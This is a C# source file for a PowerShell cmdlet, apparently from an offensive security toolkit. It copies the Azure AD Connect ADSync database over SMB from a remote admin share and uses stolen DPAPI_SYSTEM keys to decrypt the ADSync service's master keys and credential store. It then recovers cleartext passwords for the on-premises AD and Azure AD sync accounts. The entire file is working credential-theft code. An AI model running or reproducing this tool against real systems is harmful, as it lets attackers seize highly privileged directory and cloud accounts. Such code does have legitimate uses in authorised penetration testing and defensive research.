using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Xml.Linq;
using Microsoft.Data.SqlClient;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop;
using Titanis.Winterop.Security;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboAdConnectCredentialInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string InstanceId { get; init; } = string.Empty;
		public string KeysetId { get; init; } = string.Empty;
		public string Entropy { get; init; } = string.Empty;

		public int RecordIndex { get; init; }
		public string RecordType { get; init; } = string.Empty; // AzureAD | LocalAD | Unknown
		public string? Domain { get; init; }
		public string? UserName { get; init; }
		public string? Password { get; init; }

		public string? PrivateConfigurationXml { get; init; }
		public string? DecryptedConfigurationXml { get; init; }
		public string? FailureReason { get; init; }
	}

	internal sealed class AdConnectDatabaseRecord
	{
		internal string PrivateConfigurationXml { get; init; } = string.Empty;
		internal string EncryptedConfiguration { get; init; } = string.Empty;
	}

	internal sealed class AdConnectDatabaseConfig
	{
		internal string InstanceId { get; init; } = string.Empty;
		internal string KeysetId { get; init; } = string.Empty;
		internal string Entropy { get; init; } = string.Empty;
	}

	internal sealed class AdConnectDatabaseData
	{
		internal AdConnectDatabaseConfig Config { get; init; } = new();
		internal IReadOnlyList<AdConnectDatabaseRecord> Records { get; init; } = Array.Empty<AdConnectDatabaseRecord>();
	}

	internal static class AdConnectLocalDbReader
	{
		internal static AdConnectDatabaseData Read(
			string mdfPath,
			string ldfPath,
			string localDbInstance)
		{
			if (string.IsNullOrWhiteSpace(mdfPath))
				throw new ArgumentException("MDF path must be provided.", nameof(mdfPath));
			if (string.IsNullOrWhiteSpace(ldfPath))
				throw new ArgumentException("LDF path must be provided.", nameof(ldfPath));
			if (string.IsNullOrWhiteSpace(localDbInstance))
				throw new ArgumentException("LocalDB instance must be provided.", nameof(localDbInstance));

			var dbName = "TBO_ADSync_" + Guid.NewGuid().ToString("N");

			var masterConnString = new SqlConnectionStringBuilder
			{
				DataSource = $@"(LocalDB)\{localDbInstance}",
				IntegratedSecurity = true,
				ConnectTimeout = 30,
				Pooling = false
			}.ConnectionString;

			var dbConnString = new SqlConnectionStringBuilder
			{
				DataSource = $@"(LocalDB)\{localDbInstance}",
				IntegratedSecurity = true,
				InitialCatalog = dbName,
				ConnectTimeout = 30,
				Pooling = false
			}.ConnectionString;

			try
			{
				using (var master = new SqlConnection(masterConnString))
				{
					master.Open();

					using var attach = master.CreateCommand();
					attach.CommandText = $@"
CREATE DATABASE [{dbName}]
ON (FILENAME = @mdf), (FILENAME = @ldf)
FOR ATTACH;";
					attach.Parameters.AddWithValue("@mdf", mdfPath);
					attach.Parameters.AddWithValue("@ldf", ldfPath);
					attach.ExecuteNonQuery();
				}

				var records = new List<AdConnectDatabaseRecord>();
				AdConnectDatabaseConfig? config = null;

				using (var db = new SqlConnection(dbConnString))
				{
					db.Open();

					using (var cmd = db.CreateCommand())
					{
						cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;";
						using var reader = cmd.ExecuteReader();
						while (reader.Read())
						{
							var privateXml = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
							var encrypted = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
							records.Add(new AdConnectDatabaseRecord
							{
								PrivateConfigurationXml = privateXml,
								EncryptedConfiguration = encrypted
							});
						}
					}

					using (var cmd = db.CreateCommand())
					{
						cmd.CommandText = "SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;";
						using var reader = cmd.ExecuteReader();
						if (!reader.Read())
							throw new InvalidDataException("mms_server_configuration did not return a row.");

						var instanceId = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
						var keysetId = reader.IsDBNull(1) ? string.Empty : reader.GetString(1);
						var entropy = reader.IsDBNull(2) ? string.Empty : reader.GetString(2);
						config = new AdConnectDatabaseConfig
						{
							InstanceId = instanceId,
							KeysetId = keysetId,
							Entropy = entropy
						};
					}
				}

				if (config == null)
					throw new InvalidDataException("ADSync config data was empty.");

				return new AdConnectDatabaseData
				{
					Config = config,
					Records = records
				};
			}
			finally
			{
				// Best-effort detach so temp MDF/LDF files can be deleted.
				try
				{
					using var master = new SqlConnection(masterConnString);
					master.Open();

					using (var singleUser = master.CreateCommand())
					{
						singleUser.CommandText = $"ALTER DATABASE [{dbName}] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;";
						singleUser.ExecuteNonQuery();
					}

					using (var detach = master.CreateCommand())
					{
						detach.CommandText = "EXEC sp_detach_db @dbname;";
						detach.Parameters.AddWithValue("@dbname", dbName);
						detach.ExecuteNonQuery();
					}

					SqlConnection.ClearAllPools();
				}
				catch
				{
					// Ignore cleanup failures.
				}
			}
		}
	}
}

namespace Titanis.Tbo.Smb2.PowerShell
{
	[Cmdlet(VerbsCommon.Get, "TBOAdConnectCredentials")]
	[OutputType(typeof(TboAdConnectCredentialInfo))]
	public sealed class GetTBOAdConnectCredentials : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public string ShareName { get; set; } = "C$";

		[Parameter]
		public string LocalDbInstance { get; set; } = "MSSQLLocalDB";

		[Parameter]
		public string? Snapshot { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? DpapiMachineKey { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? DpapiUserKey { get; set; }

		[Parameter]
		public byte[]? DpapiMachineKeyBytes { get; set; }

		[Parameter]
		public byte[]? DpapiUserKeyBytes { get; set; }

		[Parameter]
		public SwitchParameter KeepDownloadedDb { get; set; }

		[Parameter]
		public SwitchParameter IncludeXml { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = DpapiHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = DpapiHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var (dpapiMachineKey, dpapiUserKey) = ResolveDpapiKeys();
			if (dpapiMachineKey == null || dpapiMachineKey.Length == 0)
				throw new ArgumentException("DPAPI machine key is required (pipe Get-TBORegLsaSecrets -Name DPAPI_SYSTEM).", nameof(this.DpapiMachineKey));
			if (dpapiUserKey == null || dpapiUserKey.Length == 0)
				throw new ArgumentException("DPAPI user key is required (pipe Get-TBORegLsaSecrets -Name DPAPI_SYSTEM).", nameof(this.DpapiUserKey));

			string? tempDir = null;
			string? localMdf = null;
			string? localLdf = null;
			try
			{
				var (remoteMdf, remoteLdf) = ResolveAdSyncDatabasePaths(smb, serverName, shareName, cancellationToken);

				tempDir = Path.Combine(Path.GetTempPath(), "tbo", "adsync", serverName, Guid.NewGuid().ToString("N"));
				Directory.CreateDirectory(tempDir);
				localMdf = Path.Combine(tempDir, "ADSync.mdf");
				localLdf = Path.Combine(tempDir, "ADSync_log.ldf");

				CopyRemoteFileToLocal(smb, remoteMdf, localMdf, cancellationToken);
				CopyRemoteFileToLocal(smb, remoteLdf, localLdf, cancellationToken);

				AdConnectDatabaseData dbData;
				try
				{
					dbData = AdConnectLocalDbReader.Read(localMdf, localLdf, this.LocalDbInstance);
				}
				catch (Exception ex)
				{
					throw new InvalidOperationException($"Failed to query ADSync database via LocalDB '{this.LocalDbInstance}'. Ensure LocalDB is installed and accessible. {ex.Message}", ex);
				}

				var config = dbData.Config;
				if (string.IsNullOrWhiteSpace(config.InstanceId)
					|| string.IsNullOrWhiteSpace(config.KeysetId)
					|| string.IsNullOrWhiteSpace(config.Entropy))
					throw new InvalidDataException("ADSync config values (instance_id/keyset_id/entropy) were missing.");

				byte[] entropyBytes;
				try
				{
					entropyBytes = Guid.Parse(config.Entropy).ToByteArray();
				}
				catch (Exception ex)
				{
					throw new InvalidDataException($"ADSync entropy '{config.Entropy}' was not a GUID: {ex.Message}", ex);
				}

				var keyBlob = ResolveKeyBlobFromCredentialStore(
					smb,
					serverName,
					shareName,
					config.InstanceId,
					config.KeysetId,
					dpapiMachineKey,
					dpapiUserKey,
					entropyBytes,
					cancellationToken);

				var recordIndex = 0;
				foreach (var record in dbData.Records)
				{
					cancellationToken.ThrowIfCancellationRequested();

					var privateXml = record.PrivateConfigurationXml ?? string.Empty;
					var isLocalAd = privateXml.IndexOf("forest-login-user", StringComparison.OrdinalIgnoreCase) >= 0;

					try
					{
						var clearBytes = AdConnectCrypto.DecryptEncryptedConfigurationRecord(record.EncryptedConfiguration, keyBlob);
						var clearXml = Encoding.Unicode.GetString(clearBytes).TrimEnd('\0').Replace("\0", string.Empty);

						var password = AdConnectCrypto.TryExtractXmlPassword(clearXml);

						this.WriteObject(new TboAdConnectCredentialInfo
						{
							ServerName = serverName,
							InstanceId = config.InstanceId,
							KeysetId = config.KeysetId,
							Entropy = config.Entropy,
							RecordIndex = recordIndex,
							RecordType = isLocalAd ? "LocalAD" : "AzureAD",
							Domain = isLocalAd ? AdConnectCrypto.TryExtractXmlParameter(privateXml, "forest-login-domain") : null,
							UserName = isLocalAd
								? AdConnectCrypto.TryExtractXmlParameter(privateXml, "forest-login-user")
								: AdConnectCrypto.TryExtractXmlParameter(privateXml, "UserName"),
							Password = password,
							PrivateConfigurationXml = this.IncludeXml.IsPresent ? privateXml : null,
							DecryptedConfigurationXml = this.IncludeXml.IsPresent ? clearXml : null,
							FailureReason = null
						});
					}
					catch (Exception ex)
					{
						this.WriteObject(new TboAdConnectCredentialInfo
						{
							ServerName = serverName,
							InstanceId = config.InstanceId,
							KeysetId = config.KeysetId,
							Entropy = config.Entropy,
							RecordIndex = recordIndex,
							RecordType = "Unknown",
							Domain = null,
							UserName = null,
							Password = null,
							PrivateConfigurationXml = this.IncludeXml.IsPresent ? privateXml : null,
							DecryptedConfigurationXml = null,
							FailureReason = ex.Message
						});
					}

					recordIndex++;
				}
			}
			finally
			{
				if (!this.KeepDownloadedDb.IsPresent && !string.IsNullOrWhiteSpace(tempDir))
				{
					try
					{
						if (localMdf != null && File.Exists(localMdf))
							File.Delete(localMdf);
						if (localLdf != null && File.Exists(localLdf))
							File.Delete(localLdf);
						if (Directory.Exists(tempDir))
							Directory.Delete(tempDir, recursive: true);
					}
					catch
					{
						// Best-effort cleanup.
					}
				}
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}

		private (byte[]? MachineKey, byte[]? UserKey) ResolveDpapiKeys()
		{
			var machineKey = (this.DpapiMachineKeyBytes != null && this.DpapiMachineKeyBytes.Length > 0)
				? this.DpapiMachineKeyBytes
				: null;
			var userKey = (this.DpapiUserKeyBytes != null && this.DpapiUserKeyBytes.Length > 0)
				? this.DpapiUserKeyBytes
				: null;

			if (machineKey == null && !string.IsNullOrWhiteSpace(this.DpapiMachineKey))
				machineKey = BinaryHelper.ParseHexString(this.DpapiMachineKey.AsSpan());
			if (userKey == null && !string.IsNullOrWhiteSpace(this.DpapiUserKey))
				userKey = BinaryHelper.ParseHexString(this.DpapiUserKey.AsSpan());

			return (machineKey, userKey);
		}

		private (UncPath MdfPath, UncPath LdfPath) ResolveAdSyncDatabasePaths(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			CancellationToken cancellationToken)
		{
			var fileSystem = SmbFileSystemResolver.Resolve(smb);
			var baseRel = @"Program Files\Microsoft Azure AD Sync\Data";
			var dataRoot = new UncPath(serverName, shareName, PrefixSnapshot(baseRel));

			ISmbDirectory? dir = null;
			try
			{
				dir = fileSystem.OpenDirectory(dataRoot, cancellationToken);
				var entries = dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken);

				bool HasFile(string name)
					=> entries.Any(e => (e.FileAttributes & Winterop.FileAttributes.Directory) == 0
						&& e.FileName.Equals(name, StringComparison.OrdinalIgnoreCase));

				if (HasFile("ADSync.mdf"))
				{
					var mdf = new UncPath(serverName, shareName, PrefixSnapshot($@"{baseRel}\ADSync.mdf"));
					var ldf = new UncPath(serverName, shareName, PrefixSnapshot($@"{baseRel}\ADSync_log.ldf"));
					return (mdf, ldf);
				}

				// Fallback: locate a subdirectory that contains ADSync.mdf (ex: ADSync2019).
				foreach (var entry in entries)
				{
					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;

					var candidateDirRel = $@"{baseRel}\{entry.FileName}";
					var candidateMdf = new UncPath(serverName, shareName, PrefixSnapshot($@"{candidateDirRel}\ADSync.mdf"));
					var candidateLdf = new UncPath(serverName, shareName, PrefixSnapshot($@"{candidateDirRel}\ADSync_log.ldf"));

					try
					{
						using var file = fileSystem.OpenFileRead(candidateMdf, cancellationToken);
						return (candidateMdf, candidateLdf);
					}
					catch (NtstatusException ex) when (ex.StatusCode is Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND or Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND)
					{
						continue;
					}
				}
			}
			finally
			{
				dir?.Dispose();
			}

			throw new InvalidOperationException($"Failed to locate ADSync.mdf under {dataRoot}.");
		}

		private string PrefixSnapshot(string shareRelativePath)
		{
			var snapshot = this.Snapshot;
			if (string.IsNullOrWhiteSpace(snapshot))
				return shareRelativePath;

			var trimmed = snapshot.Trim().Trim('\\');
			if (!trimmed.StartsWith("@GMT-", StringComparison.OrdinalIgnoreCase))
				throw new ArgumentException("Snapshot must be an @GMT- token (ex: @GMT-2026.02.09-12.00.00).", nameof(this.Snapshot));

			return $@"{trimmed}\{shareRelativePath}";
		}

		private void CopyRemoteFileToLocal(ISmbProviderInfo smb, UncPath remotePath, string localPath, CancellationToken cancellationToken)
		{
			var fileSystem = SmbFileSystemResolver.Resolve(smb);
			using var file = fileSystem.OpenFileRead(remotePath, cancellationToken);
			using var input = file.OpenRead();
			using var output = new FileStream(localPath, FileMode.Create, FileAccess.Write, FileShare.Read);
			input.CopyTo(output);
		}

		private byte[] ResolveKeyBlobFromCredentialStore(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			string instanceId,
			string keysetId,
			byte[] dpapiMachineKey,
			byte[] dpapiUserKey,
			byte[] entropyBytes,
			CancellationToken cancellationToken)
		{
			var fileSystem = SmbFileSystemResolver.Resolve(smb);

			var baseCandidates = new[]
			{
				@"Users\ADSync",
				@"Windows\ServiceProfiles\ADSync"
			};

			string? profileRootRel = null;
			UncPath? protectRoot = null;
			foreach (var candidate in baseCandidates)
			{
				var protect = new UncPath(serverName, shareName, PrefixSnapshot($@"{candidate}\AppData\Roaming\Microsoft\Protect"));
				try
				{
					using var dir = fileSystem.OpenDirectory(protect, cancellationToken);
					profileRootRel = candidate;
					protectRoot = protect;
					break;
				}
				catch (NtstatusException ex) when (ex.StatusCode is Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND or Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND)
				{
					continue;
				}
			}

			if (profileRootRel == null || protectRoot == null)
				throw new InvalidOperationException("Failed to locate ADSync profile directory (Users\\ADSync or Windows\\ServiceProfiles\\ADSync).");

			// Find service SID (NT SERVICE\\ADSync virtual account).
			string? serviceSid = null;
			using (var protectDir = fileSystem.OpenDirectory(protectRoot, cancellationToken))
			{
				var entries = protectDir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken);
				foreach (var entry in entries)
				{
					if (string.IsNullOrEmpty(entry.FileName) || entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					if (!isDirectory)
						continue;

					if (entry.FileName.StartsWith("S-1-5-80-", StringComparison.OrdinalIgnoreCase))
					{
						serviceSid = entry.FileName;
						break;
					}
				}
			}

			if (serviceSid == null)
				throw new InvalidOperationException("Failed to determine ADSync service SID under Protect\\.");

			var sidPreKey = AdConnectCrypto.DeriveSidPreKeyFromUserKey(serviceSid, dpapiUserKey);

			var credsDir = new UncPath(serverName, shareName, PrefixSnapshot($@"{profileRootRel}\AppData\Local\Microsoft\Credentials"));
			var credFiles = new List<string>();
			using (var dir = fileSystem.OpenDirectory(credsDir, cancellationToken))
			{
				var entries = dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken);
				foreach (var entry in entries)
				{
					if (string.IsNullOrEmpty(entry.FileName) || entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (isDirectory || isReparse)
						continue;

					credFiles.Add(entry.FileName);
				}
			}

			var serviceMasterKeyCache = new Dictionary<Guid, byte[]>();
			foreach (var fileName in credFiles)
			{
				cancellationToken.ThrowIfCancellationRequested();

				var credPath = new UncPath(serverName, shareName, PrefixSnapshot($@"{profileRootRel}\AppData\Local\Microsoft\Credentials\{fileName}"));
				byte[] fileBytes;
				try
				{
					fileBytes = DpapiHelpers.ReadFileBytes(smb, credPath, cancellationToken);
				}
				catch
				{
					continue;
				}

				var dpapiOffset = DpapiHelpers.FindMagicOffset(fileBytes);
				if (dpapiOffset < 0)
					continue;

				DpapiBlob dpapiBlob;
				try
				{
					dpapiBlob = DpapiBlob.Parse(fileBytes, dpapiOffset);
				}
				catch
				{
					continue;
				}

				if (!serviceMasterKeyCache.TryGetValue(dpapiBlob.GuidMasterKey, out var serviceMasterKey))
				{
					if (!TryDecryptServiceMasterKey(
						smb,
						serverName,
						shareName,
						profileRootRel,
						serviceSid,
						dpapiBlob.GuidMasterKey,
						sidPreKey,
						cancellationToken,
						out serviceMasterKey))
					{
						continue;
					}

					serviceMasterKeyCache[dpapiBlob.GuidMasterKey] = serviceMasterKey;
				}

				var clearResult = DpapiBlobCrypto.Decrypt(dpapiBlob, serviceMasterKey, entropy: null);
				if (!clearResult.Success || clearResult.Cleartext == null || clearResult.Cleartext.Length == 0)
					continue;

				CredManCredentialBlob cred;
				try
				{
					cred = CredManCredentialBlob.Parse(clearResult.Cleartext);
				}
				catch
				{
					continue;
				}

				if (!cred.Target.Contains("Microsoft_AzureADConnect_KeySet", StringComparison.OrdinalIgnoreCase))
					continue;

				if (!AdConnectCrypto.TryParseKeysetTarget(cred.Target, out var targetInstance, out var targetKeyset))
					continue;

				if (!targetInstance.Equals(instanceId, StringComparison.OrdinalIgnoreCase)
					|| !targetKeyset.Equals(keysetId, StringComparison.OrdinalIgnoreCase))
					continue;

				if (cred.SecretBytes == null || cred.SecretBytes.Length == 0)
					continue;

				return DecryptKeysetSecret(
					smb,
					serverName,
					shareName,
					cred.SecretBytes,
					dpapiMachineKey,
					entropyBytes,
					cancellationToken);
			}

			throw new InvalidOperationException("Failed to locate a matching Microsoft_AzureADConnect_KeySet credential for this instance/keyset.");
		}

		private bool TryDecryptServiceMasterKey(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			string profileRootRel,
			string serviceSid,
			Guid masterKeyGuid,
			byte[] sidPreKey,
			CancellationToken cancellationToken,
			out byte[] masterKey)
		{
			masterKey = Array.Empty<byte>();

			var guidName = masterKeyGuid.ToString();

			var candidates = new[]
			{
				new UncPath(serverName, shareName, PrefixSnapshot($@"{profileRootRel}\AppData\Roaming\Microsoft\Protect\{serviceSid}\{guidName}")),
				new UncPath(serverName, shareName, PrefixSnapshot($@"{profileRootRel}\AppData\Local\Microsoft\Protect\{serviceSid}\{guidName}"))
			};

			foreach (var path in candidates)
			{
				byte[] raw;
				try
				{
					raw = DpapiHelpers.ReadFileBytes(smb, path, cancellationToken);
				}
				catch
				{
					continue;
				}

				var file = DpapiMasterKeyCrypto.ParseMasterKeyFile(raw);
				var result = file.DecryptWithKey(sidPreKey);
				if (!result.Success)
					continue;

				var mk = result.MasterKeyResult?.MasterKey ?? result.BackupKeyResult?.MasterKey;
				if (mk == null || mk.Length == 0)
					continue;

				masterKey = mk;
				return true;
			}

			return false;
		}

		private byte[] DecryptKeysetSecret(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			byte[] dpapiBlobBytes,
			byte[] dpapiMachineKey,
			byte[] entropyBytes,
			CancellationToken cancellationToken)
		{
			var blob = DpapiBlob.Parse(dpapiBlobBytes);
			var machineMasterKey = DecryptMachineMasterKey(smb, serverName, shareName, blob.GuidMasterKey, dpapiMachineKey, cancellationToken);
			var clear = DpapiBlobCrypto.Decrypt(blob, machineMasterKey, entropyBytes);
			if (!clear.Success || clear.Cleartext == null || clear.Cleartext.Length == 0)
				throw new InvalidOperationException(clear.FailureReason ?? "Failed to decrypt keyset DPAPI blob.");

			return clear.Cleartext;
		}

		private byte[] DecryptMachineMasterKey(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			Guid masterKeyGuid,
			byte[] dpapiMachineKey,
			CancellationToken cancellationToken)
		{
			var guidName = masterKeyGuid.ToString();

			var candidates = new[]
			{
				new UncPath(serverName, shareName, PrefixSnapshot($@"Windows\System32\Microsoft\Protect\S-1-5-18\{guidName}")),
				new UncPath(serverName, shareName, PrefixSnapshot($@"ProgramData\Microsoft\Protect\S-1-5-18\{guidName}"))
			};

			foreach (var path in candidates)
			{
				try
				{
					var raw = DpapiHelpers.ReadFileBytes(smb, path, cancellationToken);
					var file = DpapiMasterKeyCrypto.ParseMasterKeyFile(raw);
					var result = file.DecryptWithKey(dpapiMachineKey);
					if (!result.Success)
						continue;

					var mk = result.MasterKeyResult?.MasterKey ?? result.BackupKeyResult?.MasterKey;
					if (mk == null || mk.Length == 0)
						continue;

					return mk;
				}
				catch
				{
					continue;
				}
			}

			throw new InvalidOperationException($"Failed to decrypt machine master key {masterKeyGuid}.");
		}
	}
}

namespace Titanis.Tbo.Smb2.PowerShell
{
	internal sealed class CredManCredentialBlob
	{
		internal string Target { get; init; } = string.Empty;
		internal byte[] SecretBytes { get; init; } = Array.Empty<byte>(); // impacket: Unknown3

		internal static CredManCredentialBlob Parse(byte[] data)
		{
			if (data == null || data.Length < 64)
				throw new InvalidDataException("Credential blob is truncated.");

			static uint ReadUInt32(byte[] buffer, ref int pos)
			{
				if (pos + 4 > buffer.Length)
					throw new InvalidDataException("Credential blob is truncated.");
				var value = BinaryPrimitives.ReadUInt32LittleEndian(buffer.AsSpan(pos, 4));
				pos += 4;
				return value;
			}

			static ulong ReadUInt64(byte[] buffer, ref int pos)
			{
				if (pos + 8 > buffer.Length)
					throw new InvalidDataException("Credential blob is truncated.");
				var value = BinaryPrimitives.ReadUInt64LittleEndian(buffer.AsSpan(pos, 8));
				pos += 8;
				return value;
			}

			static byte[] ReadBytes(byte[] buffer, ref int pos, int length)
			{
				if (length < 0)
					throw new InvalidDataException("Credential blob length is invalid.");
				if (pos + length > buffer.Length)
					throw new InvalidDataException("Credential blob is truncated.");
				var value = buffer.AsSpan(pos, length).ToArray();
				pos += length;
				return value;
			}

			static string ReadUtf16String(byte[] buffer, ref int pos, int length)
			{
				var bytes = ReadBytes(buffer, ref pos, length);
				return Encoding.Unicode.GetString(bytes).TrimEnd('\0');
			}

			var at = 0;
			_ = ReadUInt32(data, ref at); // Flags
			_ = ReadUInt32(data, ref at); // Size
			_ = ReadUInt32(data, ref at); // Unknown0
			_ = ReadUInt32(data, ref at); // Type
			_ = ReadUInt32(data, ref at); // Flags2
			_ = ReadUInt64(data, ref at); // LastWritten
			_ = ReadUInt32(data, ref at); // Unknown2
			_ = ReadUInt32(data, ref at); // Persist
			_ = ReadUInt32(data, ref at); // AttrCount
			_ = ReadUInt64(data, ref at); // Unknown3 (pointer/unused)

			var targetSize = checked((int)ReadUInt32(data, ref at));
			var target = ReadUtf16String(data, ref at, targetSize);

			var aliasSize = checked((int)ReadUInt32(data, ref at));
			_ = ReadUtf16String(data, ref at, aliasSize);

			var descSize = checked((int)ReadUInt32(data, ref at));
			_ = ReadUtf16String(data, ref at, descSize);

			var unknownSize = checked((int)ReadUInt32(data, ref at));
			_ = ReadUtf16String(data, ref at, unknownSize);

			var userSize = checked((int)ReadUInt32(data, ref at));
			_ = ReadUtf16String(data, ref at, userSize);

			var secretSize = checked((int)ReadUInt32(data, ref at));
			var secret = ReadBytes(data, ref at, secretSize);

			return new CredManCredentialBlob
			{
				Target = target,
				SecretBytes = secret
			};
		}
	}

	internal static class AdConnectCrypto
	{
		internal static byte[] DeriveSidPreKeyFromUserKey(string sid, byte[] dpapiUserKey)
		{
			if (string.IsNullOrWhiteSpace(sid))
				throw new ArgumentException("SID must be provided.", nameof(sid));
			if (dpapiUserKey == null || dpapiUserKey.Length == 0)
				throw new ArgumentException("DPAPI user key must be provided.", nameof(dpapiUserKey));

			// Service/virtual account DPAPI uses HMAC-SHA1(DPAPI_SYSTEM user key, SID\\0) as key material.
			return DpapiUserKeyDerivation.DeriveLocalPreKeyFromHash(sid, dpapiUserKey);
		}

		internal static bool TryParseKeysetTarget(string target, out string instanceId, out string keysetId)
		{
			instanceId = string.Empty;
			keysetId = string.Empty;

			if (string.IsNullOrWhiteSpace(target))
				return false;

			var parts = target.TrimEnd('\0').Split('_');
			if (parts.Length < 5)
				return false;

			if (!parts[0].Equals("Microsoft", StringComparison.OrdinalIgnoreCase)
				|| !parts[1].Equals("AzureADConnect", StringComparison.OrdinalIgnoreCase)
				|| !parts[2].Equals("KeySet", StringComparison.OrdinalIgnoreCase))
				return false;

			instanceId = parts[3].Trim().Trim('{', '}').ToLowerInvariant();
			keysetId = parts[4].Trim();
			return !string.IsNullOrWhiteSpace(instanceId) && !string.IsNullOrWhiteSpace(keysetId);
		}

		internal static byte[] DecryptEncryptedConfigurationRecord(string base64Record, byte[] keyBlob)
		{
			if (string.IsNullOrWhiteSpace(base64Record))
				throw new ArgumentException("Encrypted configuration record must be provided.", nameof(base64Record));
			if (keyBlob == null || keyBlob.Length < 88)
				throw new ArgumentException("Key blob must be at least 88 bytes.", nameof(keyBlob));

			var recordBytes = Convert.FromBase64String(base64Record);
			if (recordBytes.Length < 24)
				throw new InvalidDataException("Encrypted configuration record is truncated.");

			var iv = recordBytes.AsSpan(8, 16).ToArray();
			var cipherText = recordBytes.AsSpan(24).ToArray();

			var key2Start = keyBlob.Length - 88;
			var key2 = keyBlob.AsSpan(key2Start, 44).ToArray();
			var aesKey = key2.AsSpan(12).ToArray(); // 32 bytes
			if (aesKey.Length != 32)
				throw new InvalidDataException("Derived AES key was not 32 bytes.");

			var clear = DecryptAesCbcNoPadding(aesKey, iv, cipherText);
			var unpadded = Pkcs7Unpad(clear);

			return unpadded;
		}

		internal static string? TryExtractXmlPassword(string xml)
		{
			if (string.IsNullOrWhiteSpace(xml))
				return null;

			try
			{
				var doc = XDocument.Parse(xml);
				foreach (var el in doc.Descendants("attribute"))
				{
					var name = el.Attribute("name")?.Value;
					if (name == null)
						continue;

					if (name.Equals("Password", StringComparison.OrdinalIgnoreCase))
						return el.Value;
				}
			}
			catch
			{
				return null;
			}

			return null;
		}

		internal static string? TryExtractXmlParameter(string xml, string parameterName)
		{
			if (string.IsNullOrWhiteSpace(xml) || string.IsNullOrWhiteSpace(parameterName))
				return null;

			try
			{
				var doc = XDocument.Parse(xml);
				var match = doc.Descendants("parameter")
					.FirstOrDefault(x => parameterName.Equals(x.Attribute("name")?.Value, StringComparison.OrdinalIgnoreCase));
				return match?.Value;
			}
			catch
			{
				return null;
			}
		}

		private static byte[] DecryptAesCbcNoPadding(byte[] key, byte[] iv, byte[] cipherText)
		{
			if (cipherText.Length == 0 || (cipherText.Length % 16) != 0)
				throw new InvalidDataException("Ciphertext length was not a multiple of the AES block size.");

			using var aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.None;
			aes.Key = key;
			aes.IV = iv;

			using var decryptor = aes.CreateDecryptor();
			return decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
		}

		private static byte[] Pkcs7Unpad(byte[] data)
		{
			if (data == null || data.Length == 0)
				throw new InvalidDataException("Cleartext was empty.");

			var pad = data[^1];
			if (pad <= 0 || pad > 16)
				throw new InvalidDataException("Invalid PKCS7 padding.");

			var padLen = (int)pad;
			if (padLen > data.Length)
				throw new InvalidDataException("Invalid PKCS7 padding length.");

			for (int i = data.Length - padLen; i < data.Length; i++)
			{
				if (data[i] != pad)
					throw new InvalidDataException("Invalid PKCS7 padding bytes.");
			}

			return data.AsSpan(0, data.Length - padLen).ToArray();
		}
	}
}
